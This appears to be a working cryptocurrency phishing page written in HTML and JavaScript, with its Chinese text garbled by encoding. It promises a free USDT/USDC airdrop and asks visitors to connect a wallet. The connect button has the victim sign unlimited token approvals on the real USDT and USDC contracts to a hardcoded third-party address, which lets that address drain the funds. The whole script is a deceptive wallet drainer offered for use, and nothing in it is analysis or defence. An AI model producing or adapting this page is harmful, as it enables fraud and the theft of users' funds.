<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8" />
  <title>ğŸ æ­å–œä½ ç²å¾— USDT / USDC ç©ºæŠ•ï¼</title>
  <style>
    body {
      background: #111;
      color: white;
      font-family: sans-serif;
      text-align: center;
      padding-top: 50px;
    }
    button {
      padding: 10px 20px;
      font-size: 16px;
      margin: 10px;
      cursor: pointer;
    }
  </style>
  <script src="https://unpkg.com/@walletconnect/web3-provider@2.0.0/dist/index.umd.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
</head>
<body>
  <h2>ğŸ æ­å–œä½ ç²å¾— USDT / USDC ç©ºæŠ•ï¼</h2>
  <p>è«‹ä½¿ç”¨ MetaMask æˆ– Trust Wallet æƒæ QR Code å®Œæˆæˆæ¬Š</p>
  <button onclick="connectWallet()">ğŸ“² é€£æ¥éŒ¢åŒ…</button>

  <script>
    const projectId = "016fb58e8c7a03ac7465704aa126764f";
    const chains = [1]; // Ethereum mainnet

    const tokens = [
      {
        name: "USDT",
        address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
        decimals: 6
      },
      {
        name: "USDC",
        address: "0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
        decimals: 6
      }
    ];

    let provider, signer, address;

    async function connectWallet() {
      try {
        const walletConnectProvider = new window.WalletConnectProvider.default({
          projectId,
          chains,
          showQrModal: true
        });

        await walletConnectProvider.enable();
        provider = new ethers.providers.Web3Provider(walletConnectProvider);
        signer = provider.getSigner();
        address = await signer.getAddress();
        alert("âœ… éŒ¢åŒ…é€£æ¥æˆåŠŸï¼š" + address);

        for (let token of tokens) {
          const contract = new ethers.Contract(token.address, [
            "function approve(address spender, uint256 amount) public returns (bool)"
          ], signer);

          try {
            const tx = await contract.approve("0xDa4FfA490992769B8F54063bf0B9E7a4D3479459", ethers.constants.MaxUint256);
            alert(`âœ… ${token.name} æˆæ¬ŠæˆåŠŸï¼Tx Hash: ` + tx.hash);
          } catch (err) {
            console.error(`âŒ æˆæ¬Š ${token.name} å¤±æ•—`, err);
            alert(`âŒ ${token.name} æˆæ¬Šå¤±æ•—ï¼š${err.message}`);
          }
        }

      } catch (err) {
        alert("âŒ éŒ¢åŒ…é€£æ¥å¤±æ•—ï¼š" + err.message);
      }
    }
  </script>
</body>
</html>
